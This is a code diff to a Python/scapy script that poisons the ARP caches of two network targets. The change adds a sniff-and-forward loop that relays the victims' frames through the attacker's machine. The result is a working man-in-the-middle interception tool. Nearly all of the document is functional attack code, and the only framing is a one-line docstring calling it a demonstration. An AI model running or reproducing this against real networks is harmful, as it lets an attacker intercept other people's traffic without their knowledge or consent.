@@ -1,9 +1,8 @@
 import os
-from typing import Optional
-from scapy.all import ARP, Ether, sendp, getmacbyip, get_if_hwaddr, conf
 import time
+from typing import Optional
+from scapy.all import ARP, Ether, conf, get_if_hwaddr, getmacbyip, sendp, sniff
 
-#TODO: redirect victims packets to router and vice versa
 def _resolve_mac(ip: str) -> str:
     """
     Resolve a target IP to a MAC address using ARP. Returns None if unknown.
@@ -32,7 +31,7 @@ def _select_iface(target_ip: str, provided_iface: Optional[str] = None) -> str:
     return route_iface or conf.iface
 
 
-def _poison_bidirectional(ip_a: str, ip_b: str, count: int = 3, interval: float = 2.0, iface: Optional[str] = None) -> None:
+def _poison_bidirectional(ip_a: str, ip_b: str, count: int = 3, interval: float = 2.0, iface: Optional[str] = None):
     chosen_iface = _select_iface(ip_a, iface)
     conf.iface = chosen_iface
 
@@ -59,10 +58,38 @@ def _poison_bidirectional(ip_a: str, ip_b: str, count: int = 3, interval: float 
         time.sleep(interval)
 
     print("[i] ARP poisoning packets sent.")
+    return chosen_iface, attacker_mac, mac_a, mac_b
+
+
+def _bridge_loop(mac_a: str, mac_b: str, attacker_mac: str, iface: str) -> None:
+    """
+    Minimal L2 bridge: forward frames between mac_a and mac_b that arrive at us.
+    """
+    print("[i] Forwarding traffic between targets (Ctrl+C to stop)...")
+
+    def forward(pkt):
+        if not pkt.haslayer(Ether):
+            return
+        eth = pkt[Ether]
+        if eth.dst != attacker_mac:
+            return
+        if eth.src == mac_a:
+            sendp(Ether(src=attacker_mac, dst=mac_b) / pkt.payload, iface=iface, verbose=False)
+        elif eth.src == mac_b:
+            sendp(Ether(src=attacker_mac, dst=mac_a) / pkt.payload, iface=iface, verbose=False)
+
+    sniff(iface=iface, prn=forward, store=False)
 
 
 def run(target1_ip: str, target2_ip: str, count: int = 3, interval: float = 2.0, iface: Optional[str] = None) -> None:
     """
     Demonstrate basic ARP poisoning between two targets.
     """
-    _poison_bidirectional(target1_ip, target2_ip, count=count, interval=interval, iface=iface)
+    poisoned = _poison_bidirectional(target1_ip, target2_ip, count=count, interval=interval, iface=iface)
+    if not poisoned:
+        return
+    chosen_iface, attacker_mac, mac_a, mac_b = poisoned
+    try:
+        _bridge_loop(mac_a, mac_b, attacker_mac, chosen_iface)
+    except KeyboardInterrupt:
+        print("\n[i] Stopping forwarding loop.")
